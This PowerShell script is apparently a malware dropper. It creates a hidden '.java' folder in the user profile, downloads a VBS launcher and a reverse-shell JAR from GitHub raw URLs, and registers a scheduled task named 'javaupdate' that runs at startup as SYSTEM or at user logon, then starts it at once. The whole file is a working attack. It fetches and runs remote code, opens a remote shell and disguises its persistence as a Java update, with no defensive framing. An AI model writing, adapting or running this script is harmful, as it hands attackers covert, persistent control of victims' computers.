# --- Configuration ---
$taskName = "javaupdate"
$javaDir = "$env:USERPROFILE\.java"
$javaVbsPath = "$javaDir\java.vbs"
$javaJarPath = "$javaDir\javaupdate.jar"

# --- Download URLs (adjust if needed) ---
$javaVbsUrl = "https://raw.githubusercontent.com/justtesting2022/foundit/refs/heads/main/java.vbs"
$javaJarUrl = "https://raw.githubusercontent.com/ivan-sincek/java-reverse-tcp/refs/heads/main/jar/Reverse_Shell.jar"

# --- Skip if task already exists ---
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Write-Output "Task '$taskName' already exists. Exiting script."
    return
}

# --- Create hidden .java directory if needed ---
if (-not (Test-Path $javaDir)) {
    New-Item -ItemType Directory -Path $javaDir | Out-Null
    attrib +h $javaDir
}

# --- Download java.vbs ---
try {
    Invoke-WebRequest -Uri $javaVbsUrl -OutFile $javaVbsPath -ErrorAction Stop
    Write-Output "Downloaded java.vbs to $javaVbsPath"
}
catch {
    Write-Error "Failed to download java.vbs: $_"
    return
}

# --- Download javaupdate.jar ---
try {
    Invoke-WebRequest -Uri $javaJarUrl -OutFile $javaJarPath -ErrorAction Stop
    Write-Output "Downloaded javaupdate.jar to $javaJarPath"
}
catch {
    Write-Error "Failed to download javaupdate.jar: $_"
    return
}

# --- Determine privilege level ---
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# --- Create task trigger & principal ---
if ($isAdmin) {
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
    Write-Output "Running as admin: task will run at system startup."
} else {
    $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERDOMAIN\$env:USERNAME"
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    Write-Output "Running as standard user: task will run at user logon."
}

# --- Task action: run java.vbs with wscript ---
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$javaVbsPath`""

# --- Register the task ---
try {
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal
    Write-Output "Scheduled task '$taskName' created successfully."
    Start-ScheduledTask -TaskName $taskName  # <-- Task starts immediately
}
catch {
    Write-Error "Failed to register task: $_"
}
